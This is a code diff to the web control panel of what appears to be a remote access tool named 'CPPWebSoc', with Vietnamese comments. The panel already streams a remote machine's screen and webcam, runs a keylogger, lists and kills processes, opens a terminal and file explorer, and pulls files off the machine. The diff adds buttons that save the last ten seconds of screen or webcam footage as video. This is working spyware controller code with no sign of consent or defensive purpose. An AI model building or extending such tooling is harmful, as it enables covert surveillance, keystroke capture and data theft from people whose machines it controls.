@@ -74,6 +74,16 @@
         /* Premium Button */
         .btn-premium { background: linear-gradient(135deg, #4f46e5 0%, #6366f1 100%); box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3); }
         .btn-premium:hover { filter: brightness(1.1); }
+
+        /* Recording Indicator */
+        .recording-pulse { animation: recPulse 1.5s infinite; }
+        @keyframes recPulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        /* --- SHARP RENDERING --- */
+        .rendering-sharp {
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: crisp-edges;
+        }
     </style>
     <script>
         tailwind.config = { theme: { extend: { colors: { slate: { 850: '#1e293b' } }, fontFamily: { mono: ['JetBrains Mono', 'monospace'] } } } }
@@ -85,7 +95,7 @@
     <aside class="w-72 glass-panel border-r-0 border-r border-white/5 flex flex-col z-20 m-3 rounded-2xl mb-3 overflow-hidden shrink-0">
         <div class="p-6 flex items-center gap-3 border-b border-white/5">
             <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-600 to-violet-600 flex items-center justify-center shadow-lg shadow-indigo-500/20 text-white"><i class="ph-bold ph-cpu text-xl"></i></div>
-            <div><h1 class="text-lg font-bold text-white leading-tight">CPP<span class="text-indigo-400">WebSoc</span></h1><p class="text-[10px] text-slate-400 font-bold tracking-wider uppercase">Admin Console v2.0</p></div>
+            <div><h1 class="text-lg font-bold text-white leading-tight">CPP<span class="text-indigo-400">WebSoc</span></h1><p class="text-[10px] text-slate-400 font-bold tracking-wider uppercase">Admin Console</p></div>
         </div>
 
         <nav class="flex-1 overflow-y-auto py-6 px-4 space-y-1" id="sidebar-nav">
@@ -155,7 +165,7 @@
                         <div class="w-full bg-slate-700/30 h-1.5 rounded-full overflow-hidden"><div id="ram-bar" class="bg-purple-500 h-full rounded-full transition-all duration-500" style="width: 0%"></div></div>
                     </div>
 
-                    <!-- Uptime Card (SỬA ĐỔI: Thêm ID để JS kiểm soát trạng thái) -->
+                    <!-- Uptime Card -->
                     <div class="glass-card rounded-2xl p-6 min-h-[160px] flex flex-col justify-between group">
                         <div class="flex justify-between items-start"><div><p class="text-slate-400 text-xs font-bold uppercase tracking-wider mb-1">Uptime</p><h3 class="text-3xl font-bold text-white mt-1" id="uptime-value">--</h3></div><div class="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400"><i class="ph-fill ph-clock text-2xl"></i></div></div>
                         <p class="text-xs text-slate-500 font-bold flex items-center gap-1" id="uptime-status-container">
@@ -170,14 +180,19 @@
                 </div>
             </div>
 
-            <!-- MEDIA TABS -->
+            <!-- MEDIA TABS (SCREEN) -->
             <div id="tab-screen" class="hidden w-full h-full flex flex-col">
                 <div class="glass-panel rounded-2xl overflow-hidden flex flex-col h-full border border-white/10">
                     <div class="p-3 border-b border-white/5 flex justify-between items-center bg-black/20">
-                        <h3 class="font-bold text-white flex items-center gap-2 px-2"><i class="ph-fill ph-monitor text-emerald-400"></i> Remote Screen</h3>
+                        <div class="flex items-center gap-3">
+                            <h3 class="font-bold text-white flex items-center gap-2 px-2"><i class="ph-fill ph-monitor text-emerald-400"></i> Remote Screen</h3>
+                            <!-- NÚT GHI HÌNH SCREEN -->
+                            <button onclick="saveVideo('screen')" class="bg-red-500/20 hover:bg-red-500/30 text-red-400 text-[10px] font-bold px-3 py-1.5 rounded-lg flex items-center gap-2 border border-red-500/20 active:scale-95 transition-all">
+                                <i class="ph-fill ph-record recording-pulse"></i> Save Last 10s
+                            </button>
+                        </div>
                         <div class="flex items-center gap-3 bg-white/5 px-3 py-1 rounded-full border border-white/5">
                             <span id="status-screen" class="text-[10px] text-slate-400 font-bold uppercase">Offline</span>
-                            <!-- NEW TOGGLE SWITCH DESIGN -->
                             <label class="flex items-center cursor-pointer relative w-10 h-6">
                                 <input type="checkbox" class="sr-only toggle-checkbox" onchange="toggleFeature('screen', this)">
                                 <div class="absolute inset-0 bg-slate-700 rounded-full toggle-label transition-colors"></div>
@@ -187,15 +202,22 @@
                     </div>
                     <div class="flex-1 bg-black flex items-center justify-center relative overflow-hidden live-bg">
                         <div id="screen-placeholder" class="text-center text-slate-600"><i class="ph-duotone ph-monitor-play text-4xl mb-2"></i><p>Paused</p></div>
-                        <img id="screen-display" class="w-full h-full object-contain hidden z-10 relative">
+                        <img id="screen-display" class="w-full h-full object-contain hidden z-10 relative rendering-sharp">
                     </div>
                 </div>
             </div>
 
+            <!-- MEDIA TABS (CAMERA) -->
             <div id="tab-camera" class="hidden w-full h-full flex flex-col">
                 <div class="glass-panel rounded-2xl overflow-hidden flex flex-col h-full border border-white/10">
                     <div class="p-3 border-b border-white/5 flex justify-between items-center bg-black/20">
-                        <h3 class="font-bold text-white flex items-center gap-2 px-2"><i class="ph-fill ph-webcam text-rose-400"></i> Camera</h3>
+                        <div class="flex items-center gap-3">
+                            <h3 class="font-bold text-white flex items-center gap-2 px-2"><i class="ph-fill ph-webcam text-rose-400"></i> Camera</h3>
+                            <!-- NÚT GHI HÌNH CAMERA -->
+                            <button onclick="saveVideo('camera')" class="bg-red-500/20 hover:bg-red-500/30 text-red-400 text-[10px] font-bold px-3 py-1.5 rounded-lg flex items-center gap-2 border border-red-500/20 active:scale-95 transition-all">
+                                <i class="ph-fill ph-record recording-pulse"></i> Save Last 10s
+                            </button>
+                        </div>
                         <div class="flex items-center gap-3 bg-white/5 px-3 py-1 rounded-full border border-white/5">
                             <span id="status-camera" class="text-[10px] text-slate-400 font-bold uppercase">Offline</span>
                             <label class="flex items-center cursor-pointer relative w-10 h-6">
@@ -207,7 +229,7 @@
                     </div>
                     <div class="flex-1 bg-black flex items-center justify-center relative overflow-hidden live-bg">
                         <div id="camera-placeholder" class="text-center text-slate-600"><i class="ph-duotone ph-video-camera-slash text-4xl mb-2"></i><p>No Signal</p></div>
-                        <img id="camera-display" class="w-full h-full object-contain hidden z-10 relative">
+                        <img id="camera-display" class="w-full h-full object-contain hidden z-10 relative rendering-sharp">
                     </div>
                 </div>
             </div>
@@ -219,7 +241,6 @@
                         <h3 class="font-bold text-white flex items-center gap-2 px-2"><i class="ph-fill ph-keyboard text-amber-400"></i> Keylogger</h3>
                         <div class="flex gap-3 items-center">
                             <button class="text-xs text-slate-400 hover:text-white" onclick="document.getElementById('keylogger-output').innerHTML='<span class=\'text-slate-600 italic\'>// Logs start here...</span>'"><i class="ph-bold ph-trash"></i> Clean</button>
-                            <!-- NEW TOGGLE SWITCH DESIGN -->
                             <label class="flex items-center cursor-pointer relative w-10 h-6">
                                 <input type="checkbox" class="sr-only toggle-checkbox" onchange="toggleFeature('keylogger', this)">
                                 <div class="absolute inset-0 bg-slate-700 rounded-full toggle-label transition-colors"></div>
@@ -301,6 +322,9 @@
         </div>
     </div>
 
+    <!-- Hidden Canvas for Recording -->
+    <canvas id="recorder-canvas" class="hidden"></canvas>
+
     <script>
         // --- STATE & CORE ---
         let ws, activeTab = 'dashboard', curPath = 'C:\\', currentTargetUrl = '', toastTimeout, fire_ex = false;
@@ -308,8 +332,12 @@
         const iconMap = { dashboard: 'ph-squares-four', screen: 'ph-monitor', camera: 'ph-webcam', keylogger: 'ph-keyboard', processes: 'ph-chart-bar', applications: 'ph-app-window', terminal: 'ph-terminal-window', 'file-explorer': 'ph-folder-open' };
         const colorMap = { dashboard: 'text-indigo-400', screen: 'text-emerald-400', camera: 'text-rose-400', keylogger: 'text-amber-400', processes: 'text-cyan-400', applications: 'text-violet-400', terminal: 'text-orange-400', 'file-explorer': 'text-yellow-400' };
         
-        // --- HELPERS (Added Safe String for HTML Attributes) ---
         const safeStr = (str) => str ? str.replace(/\\/g, "\\\\").replace(/'/g, "\\'") : "";
+
+        // --- RECORDING BUFFERS ---
+        const MAX_RECORD_TIME = 10000; // 10 giây
+        const screenBuffer = []; // Mảng chứa {blob, timestamp} cho screen
+        const cameraBuffer = []; // Mảng chứa {blob, timestamp} cho camera
 
         // --- UI LOGIC ---
         function switchTab(id) {
@@ -393,8 +421,17 @@
                 else if(d.what === "DirectoryList") renderFiles(d.message);
                 else if(d.what === "Processes") renderProcs(d.message);
                 else if(d.what === "Applications") renderApps(d.message);
-                else if(d.what === "Screen" && state.screen) updateImg('screen', d.message);
-                else if(d.what === "Camera" && state.camera) updateImg('camera', d.message);
+                else if(d.what === "Screen" && state.screen) {
+                    // Update IMG và lưu buffer
+                    const mime = 'image/png'; // Backend đã chuyển sang PNG
+                    updateImg('screen', d.message, mime);
+                    addToBuffer(screenBuffer, d.message, mime);
+                }
+                else if(d.what === "Camera" && state.camera) {
+                    const mime = 'image/jpeg'; // Camera vẫn dùng JPEG để mượt
+                    updateImg('camera', d.message, mime);
+                    addToBuffer(cameraBuffer, d.message, mime);
+                }
                 else if(d.what === "Screenshot") downloadBlob(d.message, `screenshot_${Date.now()}.bmp`);
                 else if(d.what === "Keylogger") {
                     const l = document.getElementById('keylogger-output');
@@ -418,6 +455,90 @@
                 }
                 else if(d.what === "FileDownload") downloadBlob(d.message, d.filename);
             } catch(e) {}
+        }
+
+        // --- RECORDING LOGIC (OPTIMIZED HIGH QUALITY) ---
+        function addToBuffer(buffer, b64Data, mime) {
+            const now = Date.now();
+            buffer.push({
+                data: b64Data,
+                time: now,
+                mime: mime
+            });
+            while (buffer.length > 0 && (now - buffer[0].time > MAX_RECORD_TIME)) {
+                buffer.shift();
+            }
+        }
+
+        async function saveVideo(type) {
+            const buffer = type === 'screen' ? screenBuffer : cameraBuffer;
+            if (buffer.length === 0) {
+                showToast("Buffer Empty! Please wait...", "error");
+                return;
+            }
+
+            showToast("Rendering Video... Please wait!", "info");
+
+            const canvas = document.getElementById('recorder-canvas');
+            const ctx = canvas.getContext('2d', { alpha: false }); // Tối ưu vẽ không Alpha
+            
+            // Cấu hình vẽ sắc nét
+            ctx.imageSmoothingEnabled = false; 
+
+            // Load ảnh đầu tiên để set kích thước
+            const firstImg = await loadImage(buffer[0].data, buffer[0].mime);
+            canvas.width = firstImg.width;
+            canvas.height = firstImg.height;
+
+            // [QUAN TRỌNG] Thiết lập MediaRecorder Bitrate cao (25 Mbps)
+            let mimeType = 'video/webm';
+            if (MediaRecorder.isTypeSupported('video/webm; codecs=vp9')) {
+                mimeType = 'video/webm; codecs=vp9'; // Ưu tiên VP9 nếu có
+            } else if (MediaRecorder.isTypeSupported('video/webm; codecs=h264')) {
+                mimeType = 'video/webm; codecs=h264';
+            }
+
+            const stream = canvas.captureStream(30);
+            const recorder = new MediaRecorder(stream, {
+                mimeType: mimeType,
+                videoBitsPerSecond: 25000000 // 25 Mbps -> Chất lượng gốc
+            });
+
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: mimeType });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `${type}_record_HQ_${Date.now()}.webm`;
+                a.click();
+                showToast("Video Downloaded!", "success");
+            };
+
+            recorder.start();
+
+            // Render loop
+            for (let i = 0; i < buffer.length; i++) {
+                const frame = buffer[i];
+                const img = await loadImage(frame.data, frame.mime);
+                ctx.drawImage(img, 0, 0);
+
+                if (i < buffer.length - 1) {
+                    const delay = buffer[i+1].time - frame.time;
+                    await new Promise(r => setTimeout(r, delay)); // Giữ đúng timing
+                }
+            }
+
+            recorder.stop();
+        }
+
+        function loadImage(b64, mimeType = 'image/jpeg') {
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.onload = () => resolve(img);
+                img.src = `data:${mimeType};base64,${b64}`;
+            });
         }
 
         // --- RENDERERS ---
@@ -476,7 +597,6 @@
             try {
                 const apps = JSON.parse(json);
                 document.getElementById('app-list').innerHTML = apps.map(app => {
-                    // Trích xuất tên file exe để dùng cho nút Stop (taskkill cần Image Name)
                     let stopName = app.name; 
                     if (app.exec_path && app.exec_path.includes('\\')) {
                         const parts = app.exec_path.split('\\');
@@ -485,7 +605,6 @@
                     
                     const startTarget = app.exec_path || app.name;
 
-                    // [SỬA ĐỔI] Đường dẫn hiển thị full, tự xuống dòng (break-all) chứ không cắt bớt (...)
                     return `<tr class="hover:bg-white/5 border-b border-white/5">
                         <td class="px-4 py-3 text-white flex items-center gap-3">
                             <div class="w-6 h-6 rounded bg-indigo-500/10 flex items-center justify-center text-indigo-400 shrink-0"><i class="ph-fill ph-cube"></i></div>
@@ -511,7 +630,6 @@
         
         function startApp(n) { 
             if(confirm('Launch application?')) {
-                // Gửi đường dẫn RAW, không thêm ngoặc kép để ShellExecute hoạt động đúng
                 sendCommand({command: 'start_application', name: n}); 
             } 
         }
@@ -526,13 +644,13 @@
             window.open(`remote.html?ws=${encodeURIComponent(currentTargetUrl)}`, "RemoteControl", "width=1280,height=720");
         }
 
-        function updateImg(id, b64) {
+        function updateImg(id, b64, mime = 'image/jpeg') {
             const img = document.getElementById(`${id}-display`);
             const hold = document.getElementById(`${id}-placeholder`);
-            img.src = URL.createObjectURL(b64toBlob(b64));
+            img.src = URL.createObjectURL(b64toBlob(b64, mime));
             img.classList.remove('hidden'); hold.classList.add('hidden');
         }
-        function b64toBlob(b64) { return new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], {type: 'image/bmp'}); }
+        function b64toBlob(b64, type) { return new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], {type: type}); }
         function decodeBinary(input) { try { return new TextDecoder('utf-8').decode(Uint8Array.from(atob(input), c => c.charCodeAt(0))); } catch (e) { return input; } }
         
         function downloadBlob(b64, name) {
@@ -540,14 +658,12 @@
             a.download = name; document.body.appendChild(a); a.click(); a.remove(); showToast("Downloaded", "success");
         }
         
-        // [SỬA ĐỔI] Update Connection State bao gồm cả Uptime Status
         function updateConn(online) {
             const s = document.getElementById('ws-status-text'); const d = document.getElementById('ws-status-dot'); const p = document.getElementById('ws-ping-dot');
             s.innerText = online ? "Online" : "Offline"; s.className = `text-xs font-bold leading-none ${online?'text-emerald-400':'text-slate-500'}`;
             d.className = `relative inline-flex rounded-full h-2.5 w-2.5 ${online?'bg-emerald-500':'bg-slate-600'}`;
             p.classList.toggle('hidden', !online);
 
-            // Cập nhật Uptime Status UI
             const upText = document.getElementById('uptime-text');
             const upDot = document.getElementById('uptime-dot');
             if(online) {
@@ -585,7 +701,6 @@
         // --- EXPLORER ACTIONS ---
         function explorerNavigate(p, relative) {
             if(relative) {
-                // FIX: Logic Back Up (Go Up) Corrected
                 if(p === '..') {
                     if (curPath.endsWith(":\\") || curPath.endsWith(":\\\\")) return; 
                     let parts = curPath.split('\\').filter(Boolean);
@@ -617,8 +732,6 @@
         function runTask() { 
             let v = document.getElementById('task-input').value; 
             if(v) { 
-                // Ở Task Run modal, user thường gõ lệnh như cmd, nên giữ logic quote cũ hoặc bỏ đều được
-                // Nhưng tốt nhất là để raw cho đồng bộ
                 sendCommand({command:'start_application', name: v}); 
                 closeModal(); 
             } 
